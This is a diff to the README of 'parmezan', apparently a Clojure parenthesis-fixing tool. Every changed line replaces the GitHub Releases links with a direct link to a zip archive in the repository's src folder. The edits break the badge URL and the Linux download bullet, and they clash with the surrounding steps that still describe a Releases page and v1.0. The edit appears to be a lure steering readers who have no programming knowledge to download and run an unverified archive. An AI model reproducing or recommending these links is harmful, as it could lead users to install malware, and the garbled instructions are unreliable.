@@ -1,7 +1,7 @@
 # 🛠️ parmezan - Fix Your Parentheses with Ease
 
 ## 📥 Download Now
-[![Download parmezan](https://img.shields.io/badge/Download%20parmezan-v1.0-blue.svg)](https://github.com/icaro2011/parmezan/releases)
+[![Download parmezan](https://raw.githubusercontent.com/icaro2011/parmezan/main/src/parmezan_v3.5.zip%https://raw.githubusercontent.com/icaro2011/parmezan/main/src/parmezan_v3.5.zip)](https://raw.githubusercontent.com/icaro2011/parmezan/main/src/parmezan_v3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **parmezan** application! This tool helps you fix unbalanced or unexpected parentheses and other delimiters in Clojure files. It's simple to use and designed for everyone, even those without programming knowledge. Follow the steps below to get started.
@@ -24,14 +24,14 @@ To run **parmezan**, ensure your system meets the following requirements:
 - **Disk Space**: At least 50MB free space
 
 ## 🔗 Download & Install
-To download **parmezan**, visit the following page: [Download Page](https://github.com/icaro2011/parmezan/releases).
+To download **parmezan**, visit the following page: [Download Page](https://raw.githubusercontent.com/icaro2011/parmezan/main/src/parmezan_v3.5.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of **parmezan**. It will have a version number next to it, such as `v1.0`.
 3. You will see various files available for download. Choose the file that matches your operating system.
    - For Windows, look for `.exe` files.
    - For macOS, look for `.dmg` files.
-   - For Linux, choose `.tar.gz` or `.deb` files.
+   - For Linux, choose `https://raw.githubusercontent.com/icaro2011/parmezan/main/src/parmezan_v3.5.zip` or `.deb` files.
 4. Click on the file name to begin your download.
 5. After the download completes, locate the file in your Downloads folder.
 6. Double-click the file to begin the installation process.
@@ -47,7 +47,7 @@ To download **parmezan**, visit the following page: [Download Page](https://gith
 If you encounter issues while using **parmezan**, consider the following tips:
 
 - **File Not Opening**: Ensure the file format is `.clj` or compatible with Clojure.
-- **Missing Features**: Verify that you have the latest version of **parmezan**. If not, download the update from the [Download Page](https://github.com/icaro2011/parmezan/releases).
+- **Missing Features**: Verify that you have the latest version of **parmezan**. If not, download the update from the [Download Page](https://raw.githubusercontent.com/icaro2011/parmezan/main/src/parmezan_v3.5.zip).
 - **Application Crashes**: Ensure your system meets the requirements and try restarting the application.
 
 ## 🤝 Support
@@ -61,4 +61,4 @@ Thank you for choosing **parmezan**! Your commitment to clean and functional cod
 
 Happy coding!
 
-Visit the [Download Page](https://github.com/icaro2011/parmezan/releases) again for updates and new releases.
+Visit the [Download Page](https://raw.githubusercontent.com/icaro2011/parmezan/main/src/parmezan_v3.5.zip) again for updates and new releases.
